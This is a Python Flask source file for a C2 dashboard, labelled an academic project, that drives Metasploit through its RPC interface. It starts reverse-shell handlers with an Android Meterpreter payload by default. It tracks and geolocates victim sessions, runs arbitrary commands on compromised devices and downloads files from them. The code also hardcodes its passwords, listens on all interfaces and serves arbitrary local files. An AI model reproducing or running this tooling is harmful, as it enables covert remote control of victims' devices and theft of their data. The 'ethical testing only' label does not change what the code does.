#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
HAMZA SKU - Professional Metasploit C2 Dashboard
Real-time Integration with Metasploit Framework
Academic Project - Ethical Testing Only
"""

from flask import Flask, render_template, request, jsonify, session, redirect, url_for, send_file
from flask_socketio import SocketIO, emit
from pymetasploit3.msfrpc import MsfRpcClient
from functools import wraps
import hashlib
import os
import time
import threading
import requests
from datetime import datetime
import json
import traceback

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24).hex()
app.config['UPLOAD_FOLDER'] = 'downloads'
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['PERMANENT_SESSION_LIFETIME'] = 43200  # 12 hours

# Use threading for production-ready async
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading', 
                    ping_timeout=60, ping_interval=25)

# Create directories
os.makedirs('downloads', exist_ok=True)
os.makedirs('templates', exist_ok=True)

# Metasploit RPC Configuration
MSF_RPC_HOST = '127.0.0.1'
MSF_RPC_PORT = 55553
MSF_RPC_USER = 'msf'
MSF_RPC_PASSWORD = 'msf_password'

# Master Password (SHA-256)
MASTER_PASSWORD = 'hamza_sku_2026'
MASTER_PASSWORD_HASH = hashlib.sha256(MASTER_PASSWORD.encode()).hexdigest()

# Global State
class C2State:
    def __init__(self):
        self.msf_client = None
        self.handler_job_id = None
        self.handler_config = {
            'host': None,
            'port': None,
            'payload': None,
            'active': False
        }
        self.sessions = {}
        self.last_session_check = 0
        self.ip_cache = {}  # ✅ FIX 1: Cache للـ IP lookups
        self.connection_lock = threading.Lock()  # ✅ FIX 2: Thread safety
        self.monitor_thread = None
        self.monitor_active = False
        
    def ensure_connection(self):
        """✅ FIX 3: Connection check محسّن"""
        with self.connection_lock:
            if self.msf_client is not None:
                try:
                    # Quick check without heavy operation
                    _ = self.msf_client.sessions.list
                    return True
                except:
                    self.msf_client = None
            
            return self.connect_msf()
    
    def connect_msf(self):
        """الاتصال بـ Metasploit RPC"""
        try:
            print("[*] Connecting to Metasploit RPC...")
            
            # Try SSL first
            try:
                self.msf_client = MsfRpcClient(
                    MSF_RPC_PASSWORD,
                    server=MSF_RPC_HOST,
                    port=MSF_RPC_PORT,
                    username=MSF_RPC_USER,
                    ssl=True
                )
                print("[+] Connected to Metasploit RPC (SSL)")
            except:
                # Fallback to non-SSL
                self.msf_client = MsfRpcClient(
                    MSF_RPC_PASSWORD,
                    server=MSF_RPC_HOST,
                    port=MSF_RPC_PORT,
                    username=MSF_RPC_USER,
                    ssl=False
                )
                print("[+] Connected to Metasploit RPC (No SSL)")
            
            # Verify connection
            version = self.msf_client.core.version()
            print(f"[+] Metasploit version: {version}")
            return True
            
        except Exception as e:
            print(f"[-] Failed to connect to Metasploit RPC: {e}")
            print(f"[-] Make sure msfrpcd is running:")
            print(f"[-] msfrpcd -P {MSF_RPC_PASSWORD} -S -a {MSF_RPC_HOST}")
            self.msf_client = None
            return False
    
    def start_handler(self, host, port, payload):
        """بدء Handler حقيقي في Metasploit"""
        try:
            if not self.ensure_connection():
                return False, "Failed to connect to Metasploit RPC"
            
            print(f"[*] Starting handler: {payload} on {host}:{port}")
            
            # Configure exploit
            exploit = self.msf_client.modules.use('exploit', 'multi/handler')
            exploit['PAYLOAD'] = payload
            exploit['LHOST'] = host
            exploit['LPORT'] = port
            exploit['ExitOnSession'] = False
            
            # Execute handler
            result = exploit.execute()
            self.handler_job_id = result.get('job_id')
            
            # Update config
            self.handler_config = {
                'host': host,
                'port': port,
                'payload': payload,
                'active': True
            }
            
            # Start monitoring
            self.start_monitoring()
            
            print(f"[+] Handler started with job ID: {self.handler_job_id}")
            return True, f"Handler started on {host}:{port}"
            
        except Exception as e:
            print(f"[-] Handler start failed: {e}")
            traceback.print_exc()
            return False, f"Handler start failed: {str(e)}"
    
    def stop_handler(self):
        """إيقاف Handler"""
        try:
            if not self.ensure_connection():
                return False, "Not connected to Metasploit"
            
            # Stop monitoring first
            self.stop_monitoring()
            
            # Stop handler job
            if self.handler_job_id:
                try:
                    self.msf_client.jobs.stop(self.handler_job_id)
                    print(f"[+] Stopped handler job: {self.handler_job_id}")
                except:
                    pass
            
            # Stop all jobs (cleanup)
            try:
                jobs = self.msf_client.jobs.list
                for job_id in jobs:
                    try:
                        self.msf_client.jobs.stop(job_id)
                    except:
                        pass
            except:
                pass
            
            self.handler_job_id = None
            self.handler_config['active'] = False
            
            return True, "Handler stopped"
            
        except Exception as e:
            print(f"[-] Handler stop failed: {e}")
            return False, f"Handler stop failed: {str(e)}"
    
    def get_country_from_ip(self, ip):
        """✅ FIX 4: Cached IP geolocation"""
        # Check cache first
        if ip in self.ip_cache:
            return self.ip_cache[ip]
        
        # Skip private IPs
        if ip.startswith(('192.168.', '10.', '172.', '127.')):
            result = {'country': 'Local Network', 'flag': '🏠'}
            self.ip_cache[ip] = result
            return result
        
        # Fetch from API (with timeout and error handling)
        try:
            response = requests.get(
                f'http://ip-api.com/json/{ip}',
                timeout=2,
                headers={'User-Agent': 'HAMZA-SKU-C2'}
            )
            
            if response.status_code == 200:
                data = response.json()
                country = data.get('country', 'Unknown')
                result = {
                    'country': country,
                    'flag': self._get_flag_emoji(country),
                    'city': data.get('city', 'Unknown'),
                    'isp': data.get('isp', 'Unknown')
                }
                self.ip_cache[ip] = result
                return result
        except Exception as e:
            print(f"[!] IP lookup failed for {ip}: {e}")
        
        # Default fallback
        result = {'country': 'Unknown', 'flag': '🌍'}
        self.ip_cache[ip] = result
        return result
    
    def _get_flag_emoji(self, country):
        """Get flag emoji from country name"""
        flags = {
            'Morocco': '🇲🇦', 'France': '🇫🇷', 'USA': '🇺🇸', 'United States': '🇺🇸',
            'Germany': '🇩🇪', 'Spain': '🇪🇸', 'Italy': '🇮🇹', 'United Kingdom': '🇬🇧',
            'Canada': '🇨🇦', 'Australia': '🇦🇺', 'Japan': '🇯🇵', 'China': '🇨🇳',
            'India': '🇮🇳', 'Brazil': '🇧🇷', 'Russia': '🇷🇺', 'Netherlands': '🇳🇱',
            'Sweden': '🇸🇪', 'Norway': '🇳🇴', 'Denmark': '🇩🇰', 'Finland': '🇫🇮',
            'Poland': '🇵🇱', 'Turkey': '🇹🇷', 'Saudi Arabia': '🇸🇦', 'UAE': '🇦🇪',
            'Egypt': '🇪🇬', 'South Africa': '🇿🇦', 'Nigeria': '🇳🇬', 'Kenya': '🇰🇪'
        }
        return flags.get(country, '🌍')
    
    def get_sessions(self):
        """✅ FIX 5: Optimized session fetching"""
        try:
            if not self.ensure_connection():
                return {}
            
            # Throttle checks (max once per 2 seconds)
            current_time = time.time()
            if current_time - self.last_session_check < 2:
                return self.sessions
            
            self.last_session_check = current_time
            
            # Get sessions from Metasploit
            msf_sessions = self.msf_client.sessions.list
            
            # Process sessions
            active_session_ids = set()
            
            for sid, sess_info in msf_sessions.items():
                active_session_ids.add(sid)
                
                if sid not in self.sessions:
                    # New session detected
                    print(f"[+] New session detected: {sid}")
                    
                    # Extract IP
                    tunnel = sess_info.get('tunnel_peer', 'Unknown')
                    ip = tunnel.split(':')[0] if ':' in tunnel else 'Unknown'
                    
                    # Get location info (cached)
                    location = self.get_country_from_ip(ip)
                    
                    # Create session object
                    session_data = {
                        'id': sid,
                        'ip': ip,
                        'port': tunnel.split(':')[1] if ':' in tunnel else 'Unknown',
                        'type': sess_info.get('type', 'meterpreter'),
                        'info': sess_info.get('info', 'Unknown'),
                        'username': sess_info.get('username', 'Unknown'),
                        'hostname': sess_info.get('session_host', 'Unknown'),
                        'platform': sess_info.get('platform', 'android'),
                        'arch': sess_info.get('arch', 'Unknown'),
                        'country': location['country'],
                        'flag': location['flag'],
                        'connected_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        'last_seen': datetime.now().strftime('%H:%M:%S'),
                        'status': 'online'
                    }
                    
                    # Get system info (non-blocking)
                    try:
                        session_obj = self.msf_client.sessions.session(sid)
                        sysinfo = session_obj.run_with_output('sysinfo', timeout=3)
                        session_data['sysinfo'] = sysinfo
                    except:
                        session_data['sysinfo'] = 'Unable to retrieve'
                    
                    self.sessions[sid] = session_data
                    
                    # Emit real-time update ✅ FIX 6: WebSocket
                    socketio.emit('new_session', session_data, broadcast=True)
                    
                else:
                    # Update existing session
                    self.sessions[sid]['last_seen'] = datetime.now().strftime('%H:%M:%S')
                    self.sessions[sid]['status'] = 'online'
            
            # Mark disconnected sessions
            for sid in list(self.sessions.keys()):
                if sid not in active_session_ids:
                    self.sessions[sid]['status'] = 'offline'
                    socketio.emit('session_offline', {'id': sid}, broadcast=True)
            
            return self.sessions
            
        except Exception as e:
            print(f"[-] Error getting sessions: {e}")
            traceback.print_exc()
            return self.sessions
    
    def start_monitoring(self):
        """✅ FIX 7: Dedicated monitoring thread"""
        if self.monitor_active:
            return
        
        self.monitor_active = True
        self.monitor_thread = threading.Thread(target=self._monitor_loop, daemon=True)
        self.monitor_thread.start()
        print("[+] Session monitoring started")
    
    def stop_monitoring(self):
        """Stop monitoring thread"""
        self.monitor_active = False
        if self.monitor_thread:
            self.monitor_thread.join(timeout=5)
        print("[+] Session monitoring stopped")
    
    def _monitor_loop(self):
        """Background monitoring loop"""
        print("[*] Monitoring loop started")
        while self.monitor_active:
            try:
                sessions = self.get_sessions()
                
                # Emit periodic update
                socketio.emit('sessions_update', {
                    'sessions': list(sessions.values()),
                    'count': len(sessions),
                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                }, broadcast=True)
                
            except Exception as e:
                print(f"[-] Monitor loop error: {e}")
            
            # Sleep for 5 seconds
            time.sleep(5)
        
        print("[*] Monitoring loop stopped")
    
    def execute_command(self, session_id, command):
        """تنفيذ أمر على Session"""
        try:
            if not self.ensure_connection():
                return False, "Not connected to Metasploit"
            
            if session_id not in self.sessions:
                return False, "Session not found"
            
            # Get session object
            session_obj = self.msf_client.sessions.session(session_id)
            
            # Execute command
            output = session_obj.run_with_output(command, timeout=30)
            
            # Update last seen
            self.sessions[session_id]['last_seen'] = datetime.now().strftime('%H:%M:%S')
            
            return True, output
            
        except Exception as e:
            print(f"[-] Command execution failed: {e}")
            return False, f"Command failed: {str(e)}"
    
    def download_file(self, session_id, remote_path):
        """تحميل ملف من Session"""
        try:
            if not self.ensure_connection():
                return False, "Not connected to Metasploit", None
            
            if session_id not in self.sessions:
                return False, "Session not found", None
            
            # Get session object
            session_obj = self.msf_client.sessions.session(session_id)
            
            # Generate local filename
            filename = os.path.basename(remote_path)
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            local_path = os.path.join('downloads', f"{session_id}_{timestamp}_{filename}")
            
            # Download file
            session_obj.run_with_output(f'download "{remote_path}" "{local_path}"', timeout=60)
            
            if os.path.exists(local_path):
                file_size = os.path.getsize(local_path)
                return True, "File downloaded successfully", {
                    'path': local_path,
                    'filename': filename,
                    'size': file_size
                }
            else:
                return False, "Download failed", None
            
        except Exception as e:
            print(f"[-] File download failed: {e}")
            return False, f"Download failed: {str(e)}", None

# Initialize state
state = C2State()

# ===== Authentication =====
def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get('authenticated'):
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated

# ===== Routes =====
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        # Handle AJAX login
        if request.is_json:
            data = request.json
            password = data.get('password', '')
            password_hash = hashlib.sha256(password.encode()).hexdigest()
            
            if password_hash == MASTER_PASSWORD_HASH:
                session['authenticated'] = True
                session.permanent = True
                return jsonify({'success': True})
            return jsonify({'success': False, 'message': 'Invalid password'})
    
    # Redirect if already logged in
    if session.get('authenticated'):
        return redirect(url_for('setup'))
    
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

@app.route('/')
@login_required
def setup():
    """Setup page - Configure handler"""
    return render_template('setup.html')

@app.route('/dashboard')
@login_required
def dashboard():
    """Dashboard - View targets"""
    return render_template('dashboard.html')

@app.route('/session/<session_id>')
@login_required
def session_control(session_id):
    """Session control page"""
    if session_id not in state.sessions:
        return redirect(url_for('dashboard'))
    return render_template('session.html', session_id=session_id)

# ===== API Routes =====
@app.route('/api/login', methods=['POST'])
def api_login():
    """Alternative login endpoint"""
    data = request.json
    password = data.get('password', '')
    password_hash = hashlib.sha256(password.encode()).hexdigest()
    
    if password_hash == MASTER_PASSWORD_HASH:
        session['authenticated'] = True
        session.permanent = True
        return jsonify({'success': True})
    return jsonify({'success': False, 'message': 'Invalid password'})

@app.route('/api/handler/start', methods=['POST'])
@login_required
def api_start_handler():
    data = request.json
    host = data.get('host', '0.0.0.0')
    port = int(data.get('port', 4444))
    payload = data.get('payload', 'android/meterpreter/reverse_tcp')
    
    success, message = state.start_handler(host, port, payload)
    return jsonify({'success': success, 'message': message})

@app.route('/api/handler/stop', methods=['POST'])
@login_required
def api_stop_handler():
    success, message = state.stop_handler()
    return jsonify({'success': success, 'message': message})

@app.route('/api/handler/status')
@login_required
def api_handler_status():
    return jsonify({
        'active': state.handler_config['active'],
        'config': state.handler_config,
        'msf_connected': state.msf_client is not None
    })

@app.route('/api/sessions')
@login_required
def api_sessions():
    sessions = state.get_sessions()
    return jsonify({
        'sessions': list(sessions.values()),
        'count': len(sessions)
    })

@app.route('/api/session/<session_id>')
@login_required
def api_session_info(session_id):
    if session_id in state.sessions:
        return jsonify({
            'success': True,
            'session': state.sessions[session_id]
        })
    return jsonify({'success': False, 'message': 'Session not found'})

@app.route('/api/command', methods=['POST'])
@login_required
def api_execute_command():
    data = request.json
    session_id = data.get('session_id')
    command = data.get('command', '').strip()
    
    if not command:
        return jsonify({'success': False, 'message': 'Empty command'})
    
    success, output = state.execute_command(session_id, command)
    
    return jsonify({
        'success': success,
        'output': output,
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    })

@app.route('/api/download', methods=['POST'])
@login_required
def api_download():
    data = request.json
    session_id = data.get('session_id')
    remote_path = data.get('path')
    
    success, message, file_info = state.download_file(session_id, remote_path)
    
    return jsonify({
        'success': success,
        'message': message,
        'file': file_info
    })

@app.route('/api/file/<path:filepath>')
@login_required
def api_get_file(filepath):
    try:
        return send_file(filepath, as_attachment=True)
    except:
        return jsonify({'success': False, 'message': 'File not found'}), 404

# ===== WebSocket Events =====
@socketio.on('connect')
def handle_connect():
    print(f"[+] Client connected: {request.sid}")
    emit('connected', {'status': 'connected'})

@socketio.on('disconnect')
def handle_disconnect():
    print(f"[-] Client disconnected: {request.sid}")

@socketio.on('request_sessions')
def handle_request_sessions():
    sessions = state.get_sessions()
    emit('sessions_update', {
        'sessions': list(sessions.values()),
        'count': len(sessions)
    })

# ===== Startup =====
if __name__ == '__main__':
    print("""
╔═══════════════════════════════════════════════════════════╗
║         🔥 HAMZA SKU - C2 Dashboard 🔥                    ║
║   Professional Metasploit Integration Platform           ║
║   Academic Project - Ethical Testing Only                ║
╚═══════════════════════════════════════════════════════════╝

[*] Starting C2 Dashboard...
[!] Make sure Metasploit RPC is running:
    msfrpcd -P msf_password -S -a 127.0.0.1

[+] Access Dashboard at: http://localhost:5000
[+] Password: hamza_sku_2026

[!] Press Ctrl+C to stop
""")
    
    # Test MSF connection on startup
    if state.connect_msf():
        print("[+] Initial Metasploit connection successful")
    else:
        print("[!] Warning: Could not connect to Metasploit RPC")
        print("[!] You can still start the dashboard and connect later")
    
    socketio.run(app, host='0.0.0.0', port=5000, debug=False, allow_unsafe_werkzeug=True)
